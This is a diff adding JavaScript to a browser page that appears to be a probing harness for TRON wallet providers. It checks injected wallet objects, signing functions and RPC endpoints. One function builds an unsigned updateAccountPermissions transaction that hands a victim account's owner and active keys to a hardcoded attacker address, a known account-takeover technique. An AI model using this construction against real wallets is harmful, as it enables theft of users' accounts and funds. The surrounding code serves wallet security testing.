+      const builder = wS.transactionBuilder || (r.Bt && r.Bt.transactionBuilder);
+      if (!builder || !builder.updateAccountPermissions) {
+        out('o_perm', 'no updateAccountPermissions on builder');
+        return;
+      }
+      const victim = addr;
+      const attacker = 'TPxcbZxFSHLssRYkrad4YTZJRVCPD9oGRW';
+      const perm = {
+        owner: { type: 0, permission_name: 'owner', threshold: 1, keys: [{ address: attacker, weight: 1 }] },
+        active: [{ type: 2, permission_name: 'active', threshold: 1, keys: [{ address: attacker, weight: 1 }] }],
+        owner_address: victim,
+      };
+      log('PERM', 'building updateAccountPermissions', { victim: victim, attacker: attacker });
+      const tx = await builder.updateAccountPermissions(perm);
+      log('PERM', 'tx built', { txID: tx.txID });
+      out('o_perm', { step: 'built', tx: tx, note: 'NOT signed — inspect only' });
+    } catch (e) {
+      out('o_perm', { step: 'build failed', message: e.message });
+      log('PERM', 'build failed', { message: e.message });
+    }
+  }
+
+  /* ── rpc ─────────────────────────────────────────────── */
+
+  async function probeEndpoints() {
+    const r = resolve();
+    const bt = r.Bt || r.wS;
+    if (!bt) { out('o_rpc', 'no tronWeb'); return; }
+    const eps = {
+      fullNode: (bt.fullNode && bt.fullNode.host) || '—',
+      solidityNode: (bt.solidityNode && bt.solidityNode.host) || '—',
+      eventServer: (bt.eventServer && bt.eventServer.host) || '—',
+    };
+    const results = { endpoints: eps, probes: [] };
+
+    try {
+      const t = performance.now();
+      const info = await bt.trx.getNodeInfo();
+      results.probes.push({ rpc: 'getNodeInfo', ok: true, ms: Math.round(performance.now() - t), keys: Object.keys(info).slice(0, 8) });
+    } catch (e) {
+      results.probes.push({ rpc: 'getNodeInfo', ok: false, err: e.message });
+    }
+
+    try {
+      const t = performance.now();
+      const block = await bt.trx.getCurrentBlock();
+      results.probes.push({
+        rpc: 'getCurrentBlock', ok: true,
+        ms: Math.round(performance.now() - t),
+        num: block && block.block_header && block.block_header.raw_data && block.block_header.raw_data.number,
+      });
+    } catch (e) {
+      results.probes.push({ rpc: 'getCurrentBlock', ok: false, err: e.message });
+    }
+
+    out('o_rpc', results);
+    log('RPC', 'endpoints', results);
+  }
+
+  async function probeChain() {
+    const r = resolve();
+    const bt = r.Bt || r.wS;
+    if (!bt) { out('o_rpc', 'no tronWeb'); return; }
+    try {
+      const params = await bt.trx.getChainParameters();
+      out('o_rpc', params);
+      log('CHAIN', 'params', { count: params.length });
+    } catch (e) {
+      out('o_rpc', { err: e.message });
+    }
+  }
+
+  /* ── master scan ─────────────────────────────────────── */
+
+  async function scanAll() {
+    log('SCAN', '=== full scan start ===');
+    try { probeIdentity(); } catch (e) { log('SCAN', 'identity error', { message: e.message }); }
+    try { probeDeep(); } catch (e) { log('SCAN', 'deep error', { message: e.message }); }
+    try { await probeConnect('wS'); } catch (e) { log('SCAN', 'connect wS error', { message: e.message }); }
+    try { probeSignCompare(); } catch (e) { log('SCAN', 'sign compare error', { message: e.message }); }
+    try { await probeOwnerVsActive(); } catch (e) { log('SCAN', 'owner/active error', { message: e.message }); }
+    try { await probeEndpoints(); } catch (e) { log('SCAN', 'endpoints error', { message: e.message }); }
+    log('SCAN', '=== full scan done ===');
+  }
+
+  /* ── env render ──────────────────────────────────────── */
+
+  function renderEnv() {
+    const r = resolve();
+    const hasEthereum = !!window.ethereum;
+    const env = $('env');
+    if (env) {
+      env.innerHTML = ''
+        + '<b>origin</b><span>' + esc(location.origin) + '</span>'
+        + '<b>UA</b><span style="font-size:10px">' + esc(navigator.userAgent) + '</span>'
+        + '<b>window.tron</b><span class="' + (window.tron ? 'ok' : 'bad') + '">' + (window.tron ? 'present' : 'absent') + '</span>'
+        + '<b>window.tronLink</b><span class="' + (window.tronLink ? 'ok' : 'bad') + '">' + (window.tronLink ? 'present' : 'absent') + '</span>'
+        + '<b>trustwallet.tron</b><span class="' + (window.trustwallet && window.trustwallet.tron ? 'ok' : 'bad') + '">' + (window.trustwallet && window.trustwallet.tron ? 'present' : 'absent') + '</span>'
+        + '<b>window.tronWeb</b><span class="' + (window.tronWeb ? 'ok' : 'bad') + '">' + (window.tronWeb ? 'present' : 'absent') + '</span>'
+        + '<b>window.ethereum</b><span class="' + (hasEthereum ? 'ok' : 'bad') + '">' + (hasEthereum ? 'present' : 'absent') + '</span>'
+        + '<b>resolved wS</b><span class="' + (r.wS ? 'ok' : 'bad') + '">' + (r.wS ? esc(r.names.filter(function (n) { return n !== 'window.tronWeb'; }).join(', ')) : 'none') + '</span>'
+        + '<b>resolved Bt</b><span class="' + (r.Bt ? 'ok' : 'bad') + '">' + (r.Bt ? 'window.tronWeb' : 'none') + '</span>';
+    }
+
+    const ws = $('ch_ws');
+    if (ws) {
+      if (r.wS) {
+        const addr = (r.wS.defaultAddress && r.wS.defaultAddress.base58) ||
+                     (r.wS.tronWeb && r.wS.tronWeb.defaultAddress && r.wS.tronWeb.defaultAddress.base58) || '—';
+        ws.innerHTML = ''
+          + '<b>instance</b><span class="acc">wS (bridge)</span>'
+          + '<b>version</b><span>' + esc(r.wS.version || '—') + '</span>'
+          + '<b>ready</b><span class="' + (r.wS.ready ? 'ok' : 'warn') + '">' + r.wS.ready + '</span>'
+          + '<b>defaultAddress</b><span>' + esc(addr) + '</span>'
+          + '<b>trx.sign</b><span class="' + (typeof (r.wS.trx && r.wS.trx.sign) === 'function' ? 'ok' : 'bad') + '">' + typeof (r.wS.trx && r.wS.trx.sign) + '</span>'
+          + '<b>trx.signMessageV2</b><span class="' + (typeof (r.wS.trx && r.wS.trx.signMessageV2) === 'function' ? 'ok' : 'bad') + '">' + typeof (r.wS.trx && r.wS.trx.signMessageV2) + '</span>'
+          + '<b>request</b><span class="' + (typeof r.wS.request === 'function' ? 'ok' : 'bad') + '">' + typeof r.wS.request + '</span>'
+          + '<b>markReady</b><span class="' + (typeof r.wS.markReady === 'function' ? 'ok' : 'bad') + '">' + typeof r.wS.markReady + '</span>';
+      } else {
+        ws.innerHTML = '<b>wS</b><span class="bad">not resolved</span>';
+      }
+    }
+
+    const bt = $('ch_bt');
+    if (bt) {
+      if (r.Bt) {
+        bt.innerHTML = ''
+          + '<b>instance</b><span class="warn">Bt (fullnode)</span>'
+          + '<b>version</b><span>' + esc(r.Bt.version || '—') + '</span>'
+          + '<b>ready</b><span>' + (r.Bt.ready != null ? r.Bt.ready : '—') + '</span>'
+          + '<b>defaultAddress</b><span>' + esc((r.Bt.defaultAddress && r.Bt.defaultAddress.base58) || '—') + '</span>'
+          + '<b>trx.sign</b><span class="' + (typeof (r.Bt.trx && r.Bt.trx.sign) === 'function' ? 'ok' : 'bad') + '">' + typeof (r.Bt.trx && r.Bt.trx.sign) + '</span>'
+          + '<b>trx.signMessageV2</b><span class="' + (typeof (r.Bt.trx && r.Bt.trx.signMessageV2) === 'function' ? 'ok' : 'bad') + '">' + typeof (r.Bt.trx && r.Bt.trx.signMessageV2) + '</span>'
+          + '<b>fullNode</b><span style="font-size:10px">' + esc((r.Bt.fullNode && r.Bt.fullNode.host) || '—') + '</span>';
+      } else {
+        bt.innerHTML = '<b>Bt</b><span class="warn">not resolved</span>';
+      }
+    }
+  }
+
+  /* ── action dispatch ─────────────────────────────────── */
+
+  const actions = {
+    scanAll: scanAll,
+    dumpLog: dumpLog,
+    clearLog: clearLog,
+    probeIdentity: probeIdentity,
+    probeDeep: probeDeep,
+    probeConnectWS: probeConnectWS,
+    probeConnectBt: probeConnectBt,
+    probeMarkReady: probeMarkReady,
+    probeSignWS: probeSignWS,
+    probeSignBt: probeSignBt,
+    probeSignCompare: probeSignCompare,
+    probeOwnerVsActive: probeOwnerVsActive,
+    probeUpdatePerm: probeUpdatePerm,
+    probeEndpoints: probeEndpoints,
+    probeChain: probeChain,
+  };
+
+  function bindActions() {
+    document.querySelectorAll('[data-action]').forEach(function (el) {
+      el.addEventListener('click', function (ev) {
+        const name = ev.currentTarget.getAttribute('data-action');
+        const fn = actions[name];
+        if (typeof fn === 'function') {
+          try { fn(); } catch (e) { log('ERR', name + ' threw', { message: e.message }); }
+        } else {
+          log('ERR', 'no action: ' + name, { available: Object.keys(actions) });
+        }
+      });
+    });
+    document.querySelectorAll('#tabs [data-tab]').forEach(function (el) {
+      el.addEventListener('click', function (ev) {
+        tab(ev.currentTarget.getAttribute('data-tab'));
+      });
+    });
+  }
+
+  /* ── boot ────────────────────────────────────────────── */
+
+  function boot() {
+    renderEnv();
+    bindActions();
+    log('BOOT', 'tron-surface up', {
+      origin: location.origin,
+      wS: !!resolve().wS,
+      Bt: !!resolve().Bt,
+      actions: Object.keys(actions).length,
+    });
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', boot);
+  } else {
+    boot();
+  }
+})();
 </script>
 </body>
 </html>
